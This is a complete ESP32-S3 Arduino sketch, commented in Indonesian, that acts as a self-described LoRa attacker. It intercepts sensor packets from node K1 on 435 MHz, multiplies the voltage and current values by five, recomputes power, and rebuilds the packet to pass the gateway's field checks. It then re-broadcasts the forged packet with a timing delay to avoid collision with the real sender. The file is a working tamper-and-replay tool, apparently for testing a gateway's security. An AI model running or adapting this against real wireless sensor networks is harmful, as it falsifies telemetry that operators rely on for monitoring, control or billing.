#include <SPI.h>
#include <LoRa.h>

// Definisi PIN LoRa ESP32-S3 sesuai hardware kamu
#define LORA_SCK   12
#define LORA_MISO  13
#define LORA_MOSI  11
#define LORA_SS    10
#define LORA_RST   5
#define LORA_DIO0  4

#define LORA_FREQ  435E6

// Variabel penampung data hasil intersep
String intercepted_packet = "";
bool has_intercepted = false;

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Inisialisasi SPI dan Pin LoRa
  SPI.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_SS);
  LoRa.setPins(LORA_SS, LORA_RST, LORA_DIO0);

  if (!LoRa.begin(LORA_FREQ)) {
    Serial.println("LoRa gagal start");
    while (1);
  }

  // Parameter RF wajib identik dengan transceiver asli dan gateway
  LoRa.setSpreadingFactor(7);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(5);
  LoRa.enableCrc();

  Serial.println("[ATTACKER] Tamper Machine Active - Multiplier x5 Mode");
}

// Fungsi pembantu untuk mengambil nilai parameter dari paket yang dicegat
String getFieldFromIntercept(const String &src, const String &key) {
  int pos = 0;
  while (pos < src.length()) {
    int sep = src.indexOf(';', pos);
    if (sep < 0) sep = src.length();
    String token = src.substring(pos, sep);
    token.trim();

    const int eq = token.indexOf('=');
    if (eq > 0) {
      String tokenKey = token.substring(0, eq);
      String tokenValue = token.substring(eq + 1);
      tokenKey.trim();
      tokenValue.trim();

      if (tokenKey == key) return tokenValue;
    }
    pos = sep + 1;
  }
  return "";
}

void loop() {
  // 1. FASE INTERCEPT (Mendengarkan paket asli di udara)
  if (!has_intercepted) {
    const int packetSize = LoRa.parsePacket();
    if (packetSize) {
      intercepted_packet = "";
      while (LoRa.available()) {
        intercepted_packet += (char)LoRa.read();
      }
      intercepted_packet.trim();

      // Memastikan hanya paket dari node K1 yang dimanipulasi
      if (getFieldFromIntercept(intercepted_packet, "node") == "K1") {
        Serial.println("\n=== [ATTACKER] Paket Asli K1 Berhasil Dicegat ===");
        Serial.print("RAW DATA : "); Serial.println(intercepted_packet);
        has_intercepted = true;
      }
    }
  } 
  // 2. FASE TAMPER & TRANSMIT (Manipulasi data sensor dikali 5 dan kirim ulang)
  else {
    Serial.println("[ATTACKER] Mengekstrak dan mengalikan parameter sensor x5...");

    // Ekstrak data asli dari paket yang dicegat
    String ver  = getFieldFromIntercept(intercepted_packet, "ver");
    String node = getFieldFromIntercept(intercepted_packet, "node");
    int ctr     = getFieldFromIntercept(intercepted_packet, "ctr").toInt();
    long ts     = getFieldFromIntercept(intercepted_packet, "ts").toInt();
    float v     = getFieldFromIntercept(intercepted_packet, "v").toFloat();
    float i     = getFieldFromIntercept(intercepted_packet, "i").toFloat();

    // =================================================================
    // PROSES MANIPULASI (TAMPERING) - DIKALI 5
    // =================================================================
    float tampered_v = v * 5.0; // Tegangan dikali 5
    float tampered_i = i * 5.0; // Arus dikali 5
    float tampered_p = tampered_v * tampered_i; // Daya otomatis terhitung ulang (mW)

    // Rekonstruksi ulang paket sesuai regulasi strict hasRequiredFields() pada gateway
    String tampered_payload = "ver=" + ver + ";"
                             "node=" + node + ";"
                             "ctr=" + String(ctr) + ";"
                             "ts=" + String(ts) + ";"
                             "v=" + String(tampered_v, 3) + ";"
                             "i=" + String(tampered_i, 2) + ";"
                             "p=" + String(tampered_p, 2) + ";";

    // Jeda 150ms untuk menghindari tabrakan sinyal dengan pengirim asli
    delay(150); 

    // Pancarkan paket hasil manipulasi ke udara menuju gateway
    Serial.print("[ATTACKER] Memancarkan Paket Hasil Tampering (x5): ");
    Serial.println(tampered_payload);

    LoRa.beginPacket();
    LoRa.print(tampered_payload);
    LoRa.endPacket();

    Serial.println("[ATTACKER] Status: Tampered Packet Sent Successfully!");

    // Reset flag untuk mendengarkan intersepsi paket berikutnya
    has_intercepted = false;
  }
}